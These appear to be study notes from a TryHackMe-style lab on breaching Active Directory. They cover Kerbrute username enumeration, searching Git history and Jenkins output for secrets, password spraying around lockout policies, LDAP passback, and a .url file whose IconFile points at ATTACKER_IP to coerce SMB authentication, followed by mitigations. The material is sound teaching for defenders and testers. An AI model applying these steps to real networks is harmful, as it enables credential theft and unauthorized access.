## Task 1: Introduction


In an **Active Directory (AD)** environment, attackers first need valid credentials to gain access.

The process of obtaining those credentials is called **breaching**.


This typically involves:
1. **Reconnaissance**: Discover users, computers, services, and network information.
2. **Credential Hunting**: Look for exposed or leaked usernames and passwords.
3. **Password Spraying**: Test a small number of common passwords against many accounts.
4. **Authentication Coercion**: Trick a system or user into authenticating to an attacker-controlled system.
5. **Initial Access**: Use the obtained credentials to authenticate to the AD environment.


### Learning Objectives

In this room, we will learn:
- The principle and methodology for breaching AD environments
- Enumerating valid usernames with Kerbrute and performing password spraying attacks
- An introduction in to the world of authentication coercion and coercion-based breaches
- Common mitigations to protect against these breaching techniques

## Task 2: Active Directory Breaches

### What is AD Breaching?

**AD breaching** is the process of obtaining the **first valid Active Directory credentials** when starting without credentials.

``No Credentials`` -> ``Breaching`` -> ``Valid AD Credentials`` -> ``Enumeration`` -> ``Exploitation`` -> ``Lateral Movement`` -> ``Persistence``

<img width="900" height="450" alt="image" src="https://github.com/user-attachments/assets/ebe909e8-ec31-47e9-a6ed-e57983639056" />



### Why Initial Credentials Matter

Even a **low-privileged domain account** can provide useful information that an unauthenticated attacker cannot access.

After authentication, you may be able to enumerate:
- Users
- Groups
- Computers
- Group Policies
- Trust relationships
- Domain information

This information can reveal potential paths for further access or privilege escalation.



### AD Attack Surface

| Service        |        Port | Purpose                                          |
| -------------- | ----------: | ------------------------------------------------ |
| **SMB**        |     TCP 445 | File shares, printers, remote administration     |
| **LDAP**       | TCP 389/636 | Query/manage AD objects                          |
| **HTTP/HTTPS** |  TCP 80/443 | Internal web applications and management portals |
| **Kerberos**   |  TCP/UDP 88 | AD authentication                                |
| **DNS**        |  TCP/UDP 53 | Hostname and AD infrastructure discovery         |


> **Server Message Block (SMB)** is a communication protocol originally developed in 1983 by Barry A. Feigenbaum at IBM and intended to provide shared access to files and printers across nodes on a network of systems running IBM's OS/2. It also provides an authenticated inter-process communication (IPC) mechanism.
>
> **Transmission Control Protocol (TCP)** is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP
>
> **Lightweight Directory Access Protocol (LDAP)** is an open protocol used to access and manage directory services like Active Directory. Applications use LDAP to authenticate users by verifying their credentials directly against a domain controller.
>
> **Hypertext Transfer Protocol (HTTP)** is the protocol that specifies how a web browser and a web server communicate. Your web browser requests content from the TryHackMe web server using the HTTP protocol as you go through this room.
>
> **Domain Name System (DNS)** is the protocol responsible for resolving hostnames, such as tryhackme.com, to their respective IP addresses.

> **Kerberos** is a computer network authentication protocol that operates based on tickets, allowing nodes to securely prove their identity to one another over a non-secure network.
>
> It primarily aims at a client-server model and provides mutual authentication, where the user and the server verify each other's identity.
>
> The Kerberos protocol messages are protected against eavesdropping and replay attacks, and it builds on symmetric-key cryptography, requiring a trusted third party.



### Starting Positions

| Position                        | Meaning                                           |
| ------------------------------- | ------------------------------------------------- |
| **Unauthenticated / Black-box** | Network access but **no valid AD credentials**    |
| **Authenticated / Grey-box**    | Already have **valid low-privileged credentials** |


> **The hardest step is often obtaining the first valid credentials. Once authenticated, AD exposes much more information for enumeration and further attack paths.**

### Gathering Usernames From OSINT

**OSINT (Open-Source Intelligence)** means collecting information about a target from publicly available sources.

### Common Username Formats

Organizations often use a **consistent username format** for all employees.
| Format       | Example      | Meaning                        |
| ------------ | ------------ | ------------------------------ |
| `first.last` | `jane.smith` | First + last name              |
| `firstlast`  | `janesmith`  | First + last without separator |
| `flast`      | `jsmith`     | First initial + last name      |
| `first.l`    | `jane.s`     | First name + last initial      |
| `first`      | `jane`       | First name only                |
| `last.first` | `smith.jane` | Last name + first name         |


If OSINT gives we one confirmed account, for example: ``jane.smith@company.com``

we can infer that the organization probably uses: ``first.last``

Then, if we know another employee is ``Bob Taylor``, we can generate: ``bob.taylor``

#### How it works

| Result                 | KDC Response                  | Meaning          |
| ---------------------- | ----------------------------- | ---------------- |
| Username doesn't exist | `KDC_ERR_C_PRINCIPAL_UNKNOWN` | Invalid username |
| Username exists        | Pre-authentication requested  | Valid username   |


**Kerbrute**: https://github.com/ropnop/kerbrute

Kerberos username enumeration is useful because checking whether a username exists does not normally cause the account to be locked.

| Point                  | Meaning                                                             |
| ---------------------- | ------------------------------------------------------------------- |
| **Account Lockout**    | Username checks do not count as failed password attempts            |
| **Pre-authentication** | Failed pre-authentication isn't treated like a normal failed login  |
| **Detection**          | The Domain Controller records **Event ID 4768**                     |
| **Silent?**            | No — administrators can detect the Kerberos authentication requests |

## Task 4: Credential Discovery


### Credential Discovery in Exposed Services

**Credential discovery** means looking for usernames, passwords, API keys, and other secrets that have accidentally been exposed.

Common places include:
- Git repositories
- Jenkins/CI/CD
- Configuration files
- File shares
- Internal documentation




### Why Exposed Services Are a Goldmine

Developers and administrators often use credentials for:
- Database connections
- Service accounts
- API access
- Deployments
- Applications

These credentials can accidentally be stored in places where attackers can access them.

For example:

````mermaid
flowchart TD
    A[Source Code] -->|1. Commit| B[Password accidentally committed]
    B -->|2. Developer removes it| C[Password removed from latest code]
    C -->|3. Still stored| D[Password remains in Git history]
````

> Removing a secret from the current file does not necessarily remove it from the system's history.




### Hunting Credentials in Git Repositories

Git repositories can contain credentials in:
- Commit history
- Configuration files
- Source code
- ``.env`` files
- ``Jenkinsfile``
- CI/CD configuration

We can inspect commit history with:
````
git log -p
````
Search for common credential keywords:
````
git log -p | grep -i "password\|secret\|token\|key\|credential"
````

````mermaid
flowchart TD
    A[Git Repository] -->|1. Contains| B[Files + Commit History]
    B -->|2. Search for Secrets| C[Scan]
    C -->|3. Found| D[Possible Credentials] 
````




### Automated Git Secret Hunting

Manually checking every commit can take time.

Tools such as TruffleHog can search repositories for potential secrets.
````
trufflehog git file:///path/to/repo
````
It can help identify:
- Passwords
- API keys
- Tokens
- Other credential patterns

> Automation makes searching large Git histories easier.



### Hunting Credentials in Jenkins

**Jenkins** is a CI/CD platform used to build and deploy applications.

Because Jenkins often handles deployments, it may have access to sensitive credentials.

Potential locations include:
- Build console output
- Job configuration
- Environment variables
- Workspace files



> **CI/CD** stands for **Continuous Integration/Continuous Delivery**. They are a set of practices and principles that enable automated software releases. 




#### Build Console Output

Jenkins builds produce logs called console output.

Sometimes developers accidentally print secrets in these logs.

For example:
````
Build started
Connecting to database...
Username: admin
Password: ********
Build completed
````
We can search a build log for credential-related words:
````
curl http://ci.thm.loc/job/JOB_NAME/lastBuild/consoleText | grep -i "password\|secret\|token\|credential"
````
<img width="1192" height="110" alt="image" src="https://github.com/user-attachments/assets/568827bb-709f-40ef-aa57-036d4e46f1a5" />



#### Job Configurations

Jenkins jobs have configuration information, commonly stored in: ``config.xml``

Older or poorly configured jobs may contain:
- Usernames
- Passwords
- API tokens
- Deployment credentials

So configuration should also be inspected when authorized.



#### Environment Variables

Jenkins builds use environment variables to pass information to applications.

For example:
````
DB_USER=admin
DB_PASSWORD=example
API_TOKEN=example
````
If a build prints its environment, sensitive information may accidentally appear in the output.



#### Workspace Files

Jenkins workspaces contain files used during builds.

Look for files such as:
````
.env
config.php
application.yml
database.yml
deployment scripts
````
These may contain credentials or references to secrets.

## Task 5: Username Enumeration and Password Spraying

Try one common password against many accounts, instead of trying many passwords against one account.



### Password Spraying vs Brute-Forcing

#### Brute-Forcing

Targets one account with many passwords:

````mermaid
flowchart TD
    A[john.smith] -->|1. Try| B[Password1]
    B -->|2. Fail| C[Password2]
    C -->|3. Fail| D[Password3]
    D -->|4. Fail| E[Password4]
    E -->|5. Fail| F[...]
````

This can quickly trigger account lockout.


#### Password Spraying

Targets many accounts with one password:

````mermaid
flowchart TD
    A[Password123] -->|1. Try| B[user1]
    B -->|2. Fail| C[user2]
    C -->|3. Fail| D[user3]
    D -->|4. Fail| E[user4]
    E -->|5. Fail| F[...]
````

Then move to another password.

| Technique         | Approach                     |
| ----------------- | ---------------------------- |
| Brute-force       | Many passwords → one account |
| Password spraying | One password → many accounts |



### Understanding Lockout Policies

Before spraying, understand the domain's account lockout policy.

For example:
````
Account Lockout Threshold: 5
Reset Counter: 30 minutes
````
This means too many failed attempts can lock accounts.

A safer approach is:

````mermaid
flowchart TD
    A[Password 1] -->|1. Spray against| B[All Users]
    B -->|2. Wait for reset window| C[Reset Window]
    C -->|3. Spray| D[Password 2]
    D -->|4. Spray against| E[All Users]
````

> Always understand the lockout policy before performing authentication testing.

## Task 6: Coercion Attacks


### Introduction to Authentication Coercion

**Authentication coercion** is different from password spraying.

Instead of: ``Find password → Try password``

we try to **force a device or user to authenticate to a system we control**.

This task covers two techniques:
- LDAP Passback
- File-Based Coercion

The main idea is:

````mermaid
flowchart TD
    A[Attacker] -->|1. Forces authentication| B[Target]
    B -->|2. Sends credentials / authentication material| A
    A -->|3. Captures it| C[Captured Credentials]
````

This maps to [MITRE ATT&CK technique T1187 (Forced Authentication)](https://attack.mitre.org/techniques/T1187/).

> **Lightweight Directory Access Protocol (LDAP)** is an open protocol used to access and manage directory services like Active Directory. Applications use LDAP to authenticate users by verifying their credentials directly against a domain controller.


### What Is an LDAP Passback Attack?

Many printers and other network devices use **LDAP** to communicate with Active Directory.

The device may store an LDAP service account:
````
LDAP Username: svc.ldap
LDAP Password: ********
````
An LDAP passback attack tricks the device into sending those stored credentials to an attacker-controlled LDAP listener.

The attack flow is straightforward:

| Step                        | Action                                                          | Meaning                                             |
| --------------------------- | --------------------------------------------------------------- | --------------------------------------------------- |
| **1. Access Web Interface** | Log in to the device's **Embedded Web Service**                 | Access the device's administration panel            |
| **2. Find LDAP Settings**   | Open the **LDAP configuration** page                            | Locate the configured LDAP server                   |
| **3. Change LDAP Server**   | Replace the legitimate LDAP server with the attacker's listener | Redirects the device's LDAP connection              |
| **4. Trigger Connection**   | Click **Test Connection / Check Connection**                    | Causes the device to initiate an LDAP connection    |
| **5. Capture Credentials**  | Monitor the attacker's listener                                 | The device may send its configured LDAP credentials |


### Why Does This Work?
Common weaknesses in network devices include:

| Issue                                | Meaning                                                                                                            |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------ |
| **Default admin credentials**        | Devices may still use factory-default usernames/passwords such as `admin:admin`.                                   |
| **Over-privileged service accounts** | The LDAP account may have excessive permissions, potentially even **Domain Admin** privileges.                     |
| **Plaintext LDAP (Port 389)**        | LDAP traffic can be unencrypted, unlike **LDAPS (Port 636)**, potentially exposing credentials in transit.         |
| **No credential rotation**           | Device service-account passwords may remain unchanged for long periods, so compromised credentials may stay valid. |

### What Is File-Based Coercion?

**File-based coercion** is a technique where a specially crafted file causes Windows to automatically authenticate to an attacker-controlled machine.

The user does not need to open or click the file.

<img width="900" height="300" alt="image" src="https://github.com/user-attachments/assets/d3400983-2884-4577-9ba9-544ff003455f" />


#### Why does it work?

Windows Explorer automatically loads **icons/thumbnails** when viewing files.

A ``.url`` file can contain an IconFile field:
````
IconFile=\\ATTACKER_IP\share\icon.ico
````
Windows tries to retrieve that icon from the remote machine, which can trigger an SMB authentication attempt.


> The ``.url`` file itself is not the password.


> **Note**: Historically, .``scf`` (Shell Command File) and ``desktop.ini`` files were used for the same attack. However, Microsoft has patched these vectors on fully updated Windows 10 and 11 systems. ``.url`` files remain effective on current Windows versions and are the recommended technique for this attack.

## Task 7: Mitigation


### Secrets Management

Protect credentials and secrets from being exposed in Git, CI/CD, and configuration files.
- Use a secrets vault.
- Scan repositories for leaked secrets.
- Remove and rotate exposed credentials.
- Protect CI/CD logs.
- Password Policies & Account Lockout

> **Git** is a distributed version control system used for tracking changes in files and coordinating work among multiple contributors. It provides efficient branching, merging, and collaboration capabilities for software development projects.
>
> **ontinuous  Integration** is a software development practice that involves automatically building, testing and implementing changes to an application's source code
>
> **Amazon Web Services (AWS)** is a comprehensive cloud computing platform offered by Amazon. It provides a wide range of services such as computing power, storage, databases, networking, analytics, and more, delivered over the internet on a pay-as-you-go basis.
>
> **Embedding**: A high-dimensional numerical representation of text that captures semantic meaning rather than exact words.


### Reduce the risk of password spraying.
- Use long passwords, preferably 14+ characters.
- Block common and company-related passwords.
- Give new accounts unique passwords.
- Configure reasonable lockout policies.
- Monitor failed logins across many accounts.
- Device Hardening

### Protect printers, scanners, and other network devices.
- Change default admin passwords.
- Use **LDAPS (636)** instead of plaintext LDAP (389).
- Restrict access to device admin panels.
- Use low-privilege service accounts.
- Regularly scan and patch devices.



### File Share Security

Prevent file-based authentication coercion:
- Apply least-privilege permissions.
- Limit unnecessary write access.
- Monitor suspicious files such as .url, .lnk, .scf, and desktop.ini.
- Monitor unusual SMB authentication activity.
- NTLM Hardening



### NTLM Hardening

Goal: Prevent attackers from capturing or relaying NTLM authentication:
- Disable NTLMv1 and require NTLMv2 as the minimum authentication level via Group Policy (``Network Security: LAN Manager authentication level`` set to ``Send NTLMv2 response only. Refuse LM & NTLM``).
- Enable SMB signing to reduce NTLM relay attacks.
- Block unnecessary outbound SMB (TCP 445) connections.
- Gradually move from NTLM to Kerberos where possible.
- Network Segmentation & Access Control

> **Firewall**: A security tool, hardware or software that is used to filter network traffic by stopping unauthorized incoming and outgoing traffic.


### Network Segmentation & Access Control

Limit who can reach sensitive systems:
- **Separate networks**: Put printer admin panels, Jenkins, and Git servers in dedicated management VLANs.
- **Restrict access**: Only allow authorized users/systems to access internal services.
- **Use MFA**: Require MFA for VPN, email, and remote-access services.

> **Segmentation**: Logical or physical separation of data between tenants, roles, or departments.
